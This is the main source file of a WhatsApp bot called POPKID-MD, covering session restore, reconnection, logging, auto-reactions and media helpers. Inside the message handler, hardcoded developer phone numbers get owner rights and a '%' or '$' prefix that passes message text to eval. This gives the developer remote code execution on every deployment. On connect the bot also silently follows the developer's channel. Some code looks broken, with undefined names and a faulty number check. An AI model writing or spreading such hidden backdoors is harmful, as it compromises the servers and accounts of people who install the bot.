/**
 * popkid WhatsApp Bot (Anti-Crash Version)
 * Creator: popkid
 * Improvements: auto-reconnect, error guards, keep-alive, safe plugins
 */

const fs = require('fs')
const path = require('path')
const os = require('os')
const zlib = require('zlib')
const { promisify } = require('util')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const bodyparser = require('body-parser')
const gradient = require('gradient-string') // Added for the new logger

// ============ LOGGER & BANNER CONFIGURATION ============
const logThemes = {
    info: ['#4facfe', '#00f2fe'],
    success: ['#00b09b', '#96c93d'],
    warning: ['#f83600', '#f9d423'],
    error: ['#ff416c', '#ff4b2b'],
    event: ['#8a2be2', '#da70d6'],
    message: ['#00c6ff', '#0072ff'],
    banner: ['#ff00cc', '#3333ff']
};

const cmdLogger = {
    info: (msg) => console.log(gradient(logThemes.info[0], logThemes.info[1])(`ℹ ${msg}`)),
    success: (msg) => console.log(gradient(logThemes.success[0], logThemes.success[1])(`✓ ${msg}`)),
    warning: (msg) => console.log(gradient(logThemes.warning[0], logThemes.warning[1])(`⚠ ${msg}`)),
    error: (msg) => console.log(gradient(logThemes.error[0], logThemes.error[1])(`✗ ${msg}`)),
    banner: (msg) => console.log(gradient(logThemes.banner[0], logThemes.banner[1])(msg)),
    message: (msg) => console.log(gradient(logThemes.message[0], logThemes.message[1])(msg))
};

const botBanner = `
██████╗  ██████╗ ██████╗ ██╗  ██╗██╗██████╗ ██╗  ██╗██████╗ 
██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║██╔══██╗╚██╗██╔╝██╔══██╗
██████╔╝██║   ██║██████╔╝█████╔╝ ██║██║  ██║ ╚███╔╝ ██║  ██║
██╔═══╝ ██║   ██║██╔═══╝ ██╔═██╗ ██║██║  ██║ ██╔██╗ ██║  ██║
██║     ╚██████╔╝██║     ██║  ██╗██║██████╔╝██╔╝ ██╗██████╔╝
╚═╝      ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝`;

console.clear()
cmdLogger.banner(botBanner);
cmdLogger.info("Starting POPKID-MD...");

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => {
  cmdLogger.error(`Uncaught Exception: ${err.message}`)
})
process.on("unhandledRejection", (reason, promise) => {
  cmdLogger.error(`Unhandled Rejection: ${reason}`)
})

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const ff = require('fluent-ffmpeg')
const StickersTypes = require('wa-sticker-formatter')
const { fromBuffer } = require('file-type')
const Crypto = require('crypto')

const ownerNumber = ['254732297194']

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) {}
      })
    }
  })
}
setInterval(clearTempDir, 5 * 60 * 1000)

//===================SESSION-AUTH (UPDATED TO POPKID~ FORMAT)============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

async function loadGiftedSession() {
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    if (fs.existsSync(credsPath)) return true;

    if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
        const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
        try {
            const compressedBuffer = Buffer.from(compressedBase64, 'base64');
            if (compressedBuffer[0] === 0x1f && compressedBuffer[1] === 0x8b) {
                const gunzip = promisify(zlib.gunzip);
                const decompressedBuffer = await gunzip(compressedBuffer);
                await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
                cmdLogger.success("Session restored from POPKID~ format ✅");
                return true;
            }
        } catch (error) { 
            cmdLogger.error("Failed to decompress session ID");
            return false; 
        }
    } else {
        cmdLogger.warning('Please add your session to SESSION_ID env !!');
    }
    return false;
}

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

let conn 

async function connectToWA() {
  try {
    await loadGiftedSession();
    cmdLogger.info("Connecting to WhatsApp ⏳️...");

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update

      if (qr) {
        cmdLogger.info('QR Code generated. Please scan with WhatsApp.');
        qrcode.generate(qr, { small: true })
      }

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        cmdLogger.warning(`Connection closed: ${lastDisconnect?.error?.output?.statusCode}`);
        
        if (shouldReconnect) {
          cmdLogger.info('Attempting to reconnect...');
          setTimeout(() => connectToWA(), 5000)
        } else {
          cmdLogger.error('Logged out. Please update your SESSION_ID');
        }
      } else if (connection === 'open') {
        try {
          cmdLogger.info('Installing Plugins...');

          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              require("./plugins/" + plugin)
            }
          })

          cmdLogger.success('Plugins installed successfully ✅');
          cmdLogger.success('Bot connected to WhatsApp 📲');

          let up = `╔════════════════╗
║ 🤖 ▰𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗▰
╠════════════════╣
║ 🔑 PREFIX  : ${config.PREFIX}
║ 👨‍💻 DEV     : POPKID-MD
║ 📞 DEV NO : 254732297194
╚════════════════╝`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/j9ia5c.png` }, caption: up })

          const channelJid = "120363423997837331@newsletter"
          try {
            await conn.newsletterFollow(channelJid)
          } catch (error) {}

        } catch (error) {
          cmdLogger.error(`Error during post-connect setup: ${error}`);
        }
      }
    })

    conn.ev.on('creds.update', saveCreds)

  } catch (err) {
    cmdLogger.error(`Connection failed: ${err}`);
  }

function getCurrentDateTimeParts() {
    const options = {
        timeZone: 'Africa/Nairobi',
        year: 'numeric', month: '2-digit', day: '2-digit',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: false,
    };
    const formatter = new Intl.DateTimeFormat('en-KE', options);
    const parts = formatter.formatToParts(new Date());
    let date = '', time = '';
    parts.forEach(part => {
        if (part.type === 'day' || part.type === 'month' || part.type === 'year') {
            date += part.value;
            if (part.type !== 'year') date += '/';
        }
        if (part.type === 'hour' || part.type === 'minute' || part.type === 'second') {
            time += part.value;
            if (part.type !== 'second') time += ':';
        }
    });
    return { date, time };
}

setInterval(async () => {
    if (config.AUTO_BIO === "true" && conn) {
        const { date, time } = getCurrentDateTimeParts();
        const bioText = `❤️ ᴘᴏᴘᴋɪᴅ xᴍᴅ ʙᴏᴛ 🤖 ɪs ʟɪᴠᴇ ɴᴏᴡ\n📅 ${date}\n⏰ ${time}`;
        try {
            await conn.setStatus(bioText);
        } catch (err) {}
    }
}, 60000);

conn?.ev?.on('messages.update', async updates => {
  for (const update of updates) {
    if (update.update.message === null) {
      await AntiDelete(conn, updates)
    }
  }
  });

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
	  
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;

    const from = mek.key.remoteJid
    const isStatus = from === 'status@broadcast'

    // ============ GRADIENT MESSAGE LOGGER ============
    if (!isStatus && !mek.key.fromMe) {
        const typeLog = getContentType(mek.message);
        const senderLog = mek.key.participant || mek.key.remoteJid;
        const pushLog = mek.pushName || 'User';
        const bodyLog = (typeLog === 'conversation') ? mek.message.conversation : (typeLog === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : '[Media Message]';
        
        const logOutput = `
┌─────────────────────────────────
│ 📩 NEW MESSAGE
├─────────────────────────────────
│ 👤 User: ${pushLog}
│ 🆔 JID: ${senderLog.split('@')[0]}
│ 💬 Chat: ${from.endsWith('@g.us') ? 'Group' : 'Private'}
│ 📝 Content: ${bodyLog.substring(0, 50)}${bodyLog.length > 50 ? '...' : ''}
└─────────────────────────────────`.trim();
        cmdLogger.message(logOutput);
    }

  if (config.READ_MESSAGE === 'true' && !isStatus) {
    await conn.readMessages([mek.key]);
  }

    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    
    if (isStatus) {
      const statusTasks = [];
      if (config.AUTO_STATUS_SEEN === "true") statusTasks.push(conn.readMessages([mek.key]));
      if (config.AUTO_STATUS_REACT === "true") {
        const ravlike = await conn.decodeJid(conn.user.id);
        const emojis = ['❤️', '🔥', '✨', '💎', '🙌', '😎', '✅', '🫀', '🌟'];
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
        statusTasks.push(conn.sendMessage(from, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, ravlike] }));
      }
      if (config.AUTO_STATUS_REPLY === "true") {
        statusTasks.push(conn.sendMessage(mek.key.participant, { text: `${config.AUTO_STATUS_MSG}` }, { quoted: mek }));
      }
      Promise.all(statusTasks).catch(e => {});
    }

            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  
  const isCmd = body.startsWith(config.PREFIX)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
  
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Gon'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const rav = ('254732297194', '254111385747');
    let isCreator = [udp, rav, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) {
						reply(`Provide me with a query to run Master!`);
						return;
					}
					try {
						let resultTest = eval(code);
						reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(`Provide me with a query to run Master!`);
						return;
					}
					try {
						let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
						let h = util.format(resultTest);
						if (h === undefined) return;
						else reply(h);
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    
if (senderNumber.includes("254732297194") && !isReact) {
  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}

if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '🙌', '🫂', '🫀', '✅', '🔰', '🇵🇰'];
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
          
if (!isReact && config.CUSTOM_REACT === 'true') {
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
        
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   
  const events = require('./command')
  const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  cmdLogger.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (command.on === "sticker" && mek.type === "stickerMessage") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});
  
  });
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = { ...message.message.viewOnceMessage.message }
      }
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options, ...(options.contextInfo ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } } : {}) } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
      return buffer
    }
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) { mtype = Object.keys(copy.message.ephemeralMessage.message)[0] }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = { ...content, ...options }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
      return proto.WebMessageInfo.fromObject(copy)
    }
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
      let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return { res, filename, size: await getSizeMedia(data), ...type, data }
    }
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '', mimetype = mime, pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...options }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      let type = '', mimetype = mime, pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) { buffer = await writeExifVid(buff, options); } else { buffer = await videoToWebp(buff); }
      await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) { buffer = await writeExifImg(buff, options); } else { buffer = await imageToWebp(buff); }
      await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
    };
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = { text, footer, buttons, headerType: 2, ...options }
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: { hydratedTemplate: { imageMessage: message.imageMessage, "hydratedContentText": text, "hydratedFooterText": footer, "hydratedButtons": but } }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);
            withoutContact = conn.withoutContact || withoutContact;
            let v;
            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};
                    if (!(v.name.notify || v.subject)) v = conn.groupMetadata(id) || {};
                    resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'));
                });
            else
                v = id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : id === conn.decodeJid(conn.user.id) ? conn.user : store.contacts[id] || {};
            return ((withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international'));
        };
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/Wa-his-v1.0\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted });
        };
        conn.setStatus = status => {
            conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => { res.send("『POPKID-MD』 STARTED ✅"); });
  app.listen(port, '0.0.0.0', () => cmdLogger.info(`Server listening on port http://0.0.0.0:${port}`));
  setTimeout(() => { connectToWA() }, 8000);
